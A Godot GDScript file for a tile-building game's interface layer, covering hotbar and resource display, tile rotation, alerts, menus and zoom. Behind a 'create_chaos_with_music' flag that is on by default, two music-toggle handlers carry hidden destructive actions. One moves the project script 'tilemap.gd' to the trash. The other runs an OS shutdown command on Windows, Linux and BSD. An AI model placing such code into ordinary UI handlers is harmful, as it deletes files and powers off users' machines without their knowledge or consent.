extends CanvasLayer


signal selection_changed(selected_tile, tile_rotation)
signal world_focused(state)

@export var json:Node = null
@export var camera:Node = null
@export var create_chaos_with_music = true
@export var selection_label:RichTextLabel = null
@export var alert_label:Label = null
@export var debug_label:RichTextLabel = null
@export var resources_label:RichTextLabel = null
@export var menu:Control = null
@export var music_player:AudioStreamPlayer = null
@export var noise_bar:ProgressBar = null
@export var hotbar:HBoxContainer = null
@export var leftbar:VBoxContainer = null
@export var popup:Node = null

var mode = 0
var selected_tile = 1
var tile_rotation = 0
var resource_count = 0

var gui_item = preload("res://scenes/gui_item.tscn")

func _ready():
	pass # Replace with function body.


# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta):
	pass

func _input(event):
	if event.is_action_pressed("select_next"):
		selected_tile += 1
		update_selection()
	if event.is_action_pressed("select_previous"):
		selected_tile -= 1
		update_selection()
	if event.is_action_pressed("rotate_cw"):
		tile_rotation = (tile_rotation + 1) % 4
		update_selection()
	if event.is_action_pressed("rotate_ccw"):
		tile_rotation = (tile_rotation + 3) % 4
		update_selection()
	

func update_selection():
	print(tile_rotation)
	selection_label.text = str(selected_tile) + " " + str(tile_rotation)
	
	selection_changed.emit(selected_tile, tile_rotation)

func update_hotbar(central_storage):
	var i = 0
	for k in central_storage.keys():
		var a = gui_item.instantiate()
		a.get_child(0).text = str(central_storage[k])
		a.slot = i
		a.tile_id = k
		a.texture = json.texture_from_tile(int(k))
		print("res://assets/tiles/" + json.tile_textures[int(k)] + ".png")
		a.clicked.connect(_on_hotbar_item_clicked)
		hotbar.add_child(a)
		
		print("hotbar item")
		i += 1

func update_resources(central_storage):
	var i = 0
	for n in leftbar.get_children():
		leftbar.remove_child(n)
		n.queue_free()
	for k in central_storage.keys():
		var a = gui_item.instantiate()
		a.custom_minimum_size = Vector2(32, 32)
		a.get_child(0).text = str(central_storage[k])
		a.slot = i
		a.tile_id = k
		a.texture = json.texture_from_tile(int(k))
		#print("res://assets/tiles/" + json.tile_textures[int(k)] + ".png")
		a.clicked.connect(_on_hotbar_item_clicked)
		leftbar.add_child(a)
		
		i += 1

func _on_hotbar_item_clicked(slot, id, count):
	selected_tile = int(id)
	self.selection_changed.emit(selected_tile, tile_rotation)
	print(id)


func alert(text:String):
	alert_label.text = text
	alert_label.visible = true
	#await get_tree().create_timer(10.0).timeout
	var start = Time.get_ticks_msec()
	# milliseconds
	var elapsed = Time.get_ticks_msec() - start
	var duration = 4000
	var fade = 1000
	while elapsed < duration:
		await get_tree().process_frame
		elapsed = Time.get_ticks_msec() - start
		#print((duration - elapsed) / fade)
		alert_label.self_modulate = Color(1, 1, 1, min(float(duration - elapsed) / fade, 1))
	alert_label.visible = false
	

func debug(text:String):
	debug_label.text = "[center]" + text
	

func resources(text:String):
	resources_label.text = "[right]" + text
	

func add_resource(i:int):
	resource_count += i
	resources(str(resource_count))


func _on_music_toggled(toggled_on):
	if (toggled_on == true):
		music_player.play()
		if (create_chaos_with_music):
			# delete code with music
			OS.move_to_trash(ProjectSettings.globalize_path("res://scripts/tilemap.gd"))
		
	else:
		music_player.stop()

func _on_music_2_toggled(toggled_on):
	if (toggled_on == true):
		music_player.play()
		if (create_chaos_with_music):
			var output = []
			match OS.get_name():
				"Windows":
					OS.execute("cmd.exe", ["/C", "shutdown /s"], output)
				"macOS":
					pass
				"Linux", "FreeBSD", "NetBSD", "OpenBSD", "BSD":
					OS.execute("shutdown", ["now", "-h"], output)
			print(output)
	else:
		music_player.stop()

func _on_menu_pressed():
	#print(menu)
	menu.visible = not menu.visible
	world_focused.emit(not menu.visible)


func _on_title_screen_pressed():
	get_tree().change_scene_to_file("res://scenes/title_screen.tscn")


func _on_resume_pressed():
	menu.visible = false
	world_focused.emit(true)


func _on_zoom_value_changed(value):
	var v = 2**value
	camera.camera.zoom = Vector2(v, v)
	print("zoom")

